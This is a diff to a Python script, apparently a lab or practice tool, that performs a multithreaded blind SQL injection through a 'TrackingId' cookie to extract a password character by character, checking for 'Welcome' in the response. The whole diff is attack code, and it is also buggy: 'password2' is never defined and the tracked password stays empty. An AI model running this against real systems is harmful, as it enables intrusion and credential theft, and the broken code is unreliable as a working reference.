@@ -7,6 +7,7 @@ import pdb
 import requests
 import string
 import threading
+
 def sigint_handler(signal, frame):
     print("\n\n [*] Saliendo... \n")
     sys.exit(1)
@@ -20,9 +21,9 @@ if (len(sys.argv) != 2):
 #Global vars
 url = sys.argv[1]
 data = {}
-characters = string.printable
+characters = string.ascii_letters + string.digits + string.punctuation
 
-def findChar(position, trackingIdCookie):
+def findChar(position, trackingIdCookie, p1, p2,s, characters_array,password):
     for char in characters:
         if char == ';' or char == '\n':
             continue
@@ -33,7 +34,9 @@ def findChar(position, trackingIdCookie):
         s.cookies.set('TrackingId', injection)
         r = s.get(url)
         if ("Welcome" in r.text):
-            password += char
+            #print(type(password[position-1]))
+            #password[position-1] = char
+            characters_array.append((position,char))
             p2.status(password)
             break
 
@@ -46,15 +49,22 @@ def atacksqli():
     request_inicial = s.get(url)
     cookies_init = s.cookies.get_dict()
     trackingIdCookie = cookies_init['TrackingId']
-    password = ''
+    characters_array = []
     threads = []
+    password = '' * 40
     for position in range(1,40):
-        thread = threading.Thread(target=findChar,args=(position,trackingIdCookie))
+        thread = threading.Thread(target=findChar,args=(position,trackingIdCookie,p1,p2,s,characters_array,password))
         threads.append(thread)
         thread.start()
 
     for thread in threads:
         thread.join()
+    
+    sorted_by_position = sorted(characters_array, key=lambda tup: tup[0])
+    for char_sorted in sorted_by_position:
+        password2 += char_sorted[1]
+    print(password)
+    print(password2)
 
 if __name__ == "__main__":
     atacksqli()
